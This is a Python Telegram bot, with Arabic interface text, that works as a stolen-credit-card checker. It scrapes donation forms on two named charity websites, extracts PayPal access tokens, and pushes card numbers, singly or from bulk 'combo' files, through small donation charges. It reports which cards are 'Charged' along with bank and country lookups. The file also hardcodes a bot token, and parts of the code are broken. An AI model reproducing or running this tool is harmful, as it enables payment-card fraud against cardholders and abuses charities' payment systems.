import requests, json, re, random, sys, os, time, base64, html
import urllib3
import asyncio
from requests_toolbelt import MultipartEncoder
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعدادات البوت
TOKEN = '7803099267:AAFonfKn2Zbo0ENoSyzsk7Jp45KVM6uChfk'
ADMIN_ID = 7533168895

# البوابات
GATES = {
    'V1': {
        'name': 'Paypal V1',
        'site': 'https://alhijrahtrust.org/donations/old-phase-2-archive/',
        'base': 'https://alhijrahtrust.org'
    },
    'V2': {
        'name': 'Paypal V2',
        'site': 'https://yanacocharescue.com/?givewp-route=donation-form-view&form-id=1329&locale=en_US',
        'base': 'https://yanacocharescue.com'
    }
}

UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'

# متغيرات الحالة
is_running = False
stop_requested = False
check_amount = "1.00"
pending_data = {} # لتخزين البيانات المؤقتة قبل اختيار البوابة

def get_bin_info(cc):
    try:
        bin_num = cc[:6]
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            bank = data.get('bank', {}).get('name', 'Unknown')
            country = data.get('country', {}).get('name', 'Unknown')
            flag = data.get('country', {}).get('emoji', '')
            brand = data.get('brand', 'Unknown')
            type_ = data.get('type', 'Unknown')
            return f"{bin_num} - {brand} - {type_}", bank, f"{country} {flag}"
    except: pass
    return "Unknown", "Unknown", "Unknown"

def extract_data(gate_key):
    gate = GATES[gate_key]
    s = requests.Session()
    s.verify = False
    headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
    try:
        r = s.get(gate['site'], headers=headers, timeout=20)
        html_content = r.text
        if 'givewp-route=donation-form-view' in html_content and 'givewp-route-signature' not in html_content:
            fid = re.search(r'form-id[=]+(\d+)', html_content)
            if fid:
                iframe = f"{gate['base']}/?givewp-route=donation-form-view&form-id={fid.group(1)}"
                r2 = s.get(iframe, headers=headers, timeout=20)
                html_content = r2.text
        fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html_content)
        fi = re.search(r'name="give-form-id" value="(.*?)"', html_content)
        nc = re.search(r'name="give-form-hash" value="(.*?)"', html_content)
        if not all([fp, fi, nc]): return None
        enc = re.search(r'"data-client-token":"(.*?)"', html_content)
        if not enc: return None
        dec = base64.b64decode(enc.group(1)).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec)
        if not au: return None
        return {'fp': fp.group(1), 'fi': fi.group(1), 'nc': nc.group(1), 'at': au.group(1), 'session': s}
    except: return None

def check_card(ccx, amount, gate_key):
    try:
        gate = GATES[gate_key]
        ccx = ccx.strip()
        parts = ccx.split('|')
        if len(parts) < 4: return 'INVALID_FORMAT'
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2: yy = '20' + yy
        email = f'drgam{random.randint(100,999)}@gmail.com'
        d = extract_data(gate_key)
        if not d: return 'EXTRACT_FAILED'
        s, fp, fi, nc, at = d['session'], d['fp'], d['fi'], d['nc'], d['at']
        
        headers = {
            'origin': gate['base'], 'referer': gate['site'],
            'user-agent': UA, 'x-requested-with': 'XMLHttpRequest',
        }
        
        # Create Order
        mp = MultipartEncoder(fields={
            'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
            'give-form-hash': nc, 'give-amount': amount, 'payment-mode': 'paypal-commerce',
            'give_first': 'SIKO', 'give_last': 'rights', 'give_email': email,
            'give_action': 'purchase', 'give-gateway': 'paypal-commerce', 'action': 'give_process_donation', 'give_ajax': 'true'
        })
        headers['content-type'] = mp.content_type
        r1 = s.post(f"{gate['base']}/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order", headers=headers, data=mp, timeout=20)
        tok = r1.json()['data']['id']
        
        # Confirm Payment
        pp_headers = {'authorization': f'Bearer {at}', 'content-type': 'application/json', 'user-agent': UA}
        json_data = {'payment_source': {'card': {'number': cc, 'expiry': f'{yy}-{mm}', 'security_code': cvv}}}
        s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=pp_headers, json=json_data, timeout=20)
        
        # Approve Order
        r2 = s.post(f"{gate['base']}/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={tok}", headers=headers, data=mp, timeout=20)
        txt = r2.text
        
        if 'true' in txt or 'success' in txt: return 'Charged !'
        for err in ['DO_NOT_HONOR', 'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE', 'INSUFFICIENT_FUNDS', 'GENERIC_DECLINE']:
            if err in txt: return f'Declined | {err}'
        return f'Response | {txt[:50]}'
    except Exception as e: return f"Error: {str(e)}"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    welcome = (
        "👋 أهلاً بك في بوت فحص البطاقات الاحترافي!

        " 🚀 طريقة الاستخدام:" 
"• أرسل البطاقة بصيغة: cc|mm|yy|cvv للفحص الفردي." 
"• أرسل ملف نصي (Combo) للفحص الجماعي."

"🛠 الأوامر المتاحة:"
"• /start - بدء تشغيل البوت." 
"• /amount [القيمة] - تحديد مبلغ الفحص (مثلاً: /amount 0.4)." 
"• /stop - إيقاف عملية الفحص الجارية." 

" ✨ البوت يعمل الآن ومستعد لخدمتك!"
    )
    await update.message.reply_text(welcome, parse_mode='HTML')

async def set_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global check_amount
    if update.effective_user.id != ADMIN_ID: return
    if context.args:
        check_amount = context.args[0]
        await update.message.reply_text(f"✅ تم تحديد المبلغ: <code>{check_amount}</code>", parse_mode='HTML')

async def stop_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_requested, is_running
    if update.effective_user.id != ADMIN_ID: return
    stop_requested = True
    is_running = False
    await update.message.reply_text("🛑 تم إيقاف العملية وإعادة التعيين.")

async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running, pending_data
    if update.effective_user.id != ADMIN_ID: return
    if is_running:
        await update.message.reply_text("⚠️ هناك عملية جارية بالفعل!")
        return
    
    keyboard = [
        [InlineKeyboardButton("Paypal V1 ⚡", callback_data='gate_V1')],
        [InlineKeyboardButton("Paypal V2 🔥", callback_data='gate_V2')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.message.document:
        pending_data[update.effective_user.id] = {'type': 'file', 'file_id': update.message.document.file_id, 'name': update.message.document.file_name}
        await update.message.reply_text("⚙️ <b>اختر البوابة لبدء فحص الملف:</b>", reply_markup=reply_markup, parse_mode='HTML')
    elif '|' in update.message.text:
        pending_data[update.effective_user.id] = {'type': 'card', 'text': update.message.text}
        await update.message.reply_text("⚙️ <b>اختر البوابة لفحص البطاقة:</b>", reply_markup=reply_markup, parse_mode='HTML')

async def gate_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running, stop_requested, check_amount, pending_data
    query = update.callback_query
    user_id = query.from_user.id
    gate_key = query.data.split('_')[1]
    
    if user_id not in pending_data:
        await query.answer("انتهت صلاحية الطلب.")
        return
    
    data = pending_data.pop(user_id)
    await query.edit_message_text(f"🚀 تم اختيار <b>{GATES[gate_key]['name']}</b>. جاري البدء...", parse_mode='HTML')
    
    is_running = True
    stop_requested = False
    
    if data['type'] == 'card':
        await process_single_card(query.message, data['text'], gate_key, query.from_user)
    else:
        await process_file(query.message, data['file_id'], data['name'], gate_key, query.from_user)
    
    is_running = False

async def process_single_card(message, card, gate_key, user):
    start_time = time.time()
    result = await asyncio.to_thread(check_card, card, check_amount, gate_key)
    time_taken = f"{time.time() - start_time:.2f}s"
    bin_info, bank, country = get_bin_info(card)
    status = "Approved ✅" if "charged" in result.lower() else "Declined ❌"
    
    response = (
        f"- - - - - - - - - - - - - - - - - - - - - - -\n"
        f"[ϟ] 𝐂𝐚𝐫𝐝: <code>{html.escape(card)}</code> 💳\n"
        f"[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>{status}</b>\n"
        f"[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{html.escape(result)}</code>\n"
        f"- - - - - - - - - - - - - - - - - - - - - - -\n"
        f"[ϟ] 𝐁𝐢𝐧: <code>{bin_info}</code>\n"
        f"[ϟ] 𝐁𝐚𝐧𝐤: <code>{bank}</code>\n"
        f"[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>\n"
        f"- - - - - - - - - - - - - - - - - - - - - - -\n"
        f"[ϟ] T/t : {time_taken} | Gate: {GATES[gate_key]['name']}\n"
        f"[⌥] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: @{html.escape(user.username or 'Admin')} 💪\n"
        f"[⌥] 𝐆𝐚𝐭𝐞 𝐏𝐫𝐢𝐜𝐞: ${check_amount}\n"
        f"- - - - - - - - - - - - - - - - - - - - - - -\n"
        f"[⌥] 𝐓𝐨𝐨𝐥 𝐁𝐲: 𝑺𝑰𝑲𝑶 [⌤] 🍀"
    )
    await message.reply_text(response, parse_mode='HTML')

async def process_file(message, file_id, file_name, gate_key, user):
    global stop_requested
    file = await context.bot.get_file(file_id)
    path = f"temp_{file_name}"
    await file.download_to_drive(path)
    
    with open(path, 'r') as f: cards = [l.strip() for l in f if '|' in l]
    total, charged, declined = len(cards), 0, 0
    status_msg = await message.reply_text("⏳ جاري معالجة الملف...")
    
    for i, card in enumerate(cards, 1):
        if stop_requested: break
        start_time = time.time()
        result = await asyncio.to_thread(check_card, card, check_amount, gate_key)
        time_taken = f"{time.time() - start_time:.2f}s"
        
        if 'charged' in result.lower():
            charged += 1
            bin_info, bank, country = get_bin_info(card)
            hit = (
                f"- - - - - - - - - - - - - - - - - - - - - - -\n"
                f"[ϟ] 𝐂𝐚𝐫𝐝: <code>{html.escape(card)}</code> 💳\n"
                f"[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved ✅</b>\n"
                f"[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{html.escape(result)}</code>\n"
                f"- - - - - - - - - - - - - - - - - - - - - - -\n"
                f"[ϟ] 𝐁𝐢𝐧: <code>{bin_info}</code>\n"
                f"[ϟ] 𝐁𝐚𝐧𝐤: <code>{bank}</code>\n"
                f"[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>\n"
                f"- - - - - - - - - - - - - - - - - - - - - - -\n"
                f"[ϟ] T/t : {time_taken} | Gate: {GATES[gate_key]['name']}\n"
                f"[⌥] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: @{html.escape(user.username or 'Admin')} 💪\n"
                f"- - - - - - - - - - - - - - - - - - - - - - -\n"
                f"[⌥] 𝐓𝐨𝐨𝐥 𝐁𝐲: 𝑺𝑰𝑲𝑶 [⌤] 🍀"
            )
            await message.reply_text(hit, parse_mode='HTML')
        else: declined += 1
        
        if i % 2 == 0 or i == total:
            bar = "▓" * int((i/total)*10) + "░" * (10 - int((i/total)*10))
            await status_msg.edit_text(
                f"📊 <b>حالة الفحص ({GATES[gate_key]['name']}):</b>\n"
                f"━━━━━━━━━━━━━━\n"
                f"✅ Charge: <code>{charged}</code>\n"
                f"❌ Declined: <code>{declined}</code>\n"
                f"🔄 Remaining : <code>{total - i}</code>\n"
                f"📈 Progress: <code>{i}/{total}</code>\n"
                f"🎬 Tape: <code>[{bar}]</code>\n"
                f"━━━━━━━━━━━━━━", parse_mode='HTML'
            )
        await asyncio.sleep(0.1)
    
    os.remove(path)
    await message.reply_text(f"🏁 انتهى الفحص! Charge {charged} بطاقة.")

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("amount", set_amount))
    app.add_handler(CommandHandler("stop", stop_process))
    app.add_handler(CallbackQueryHandler(gate_callback))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_input))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_input))
    print("Bot is running...")
    app.run_polling()
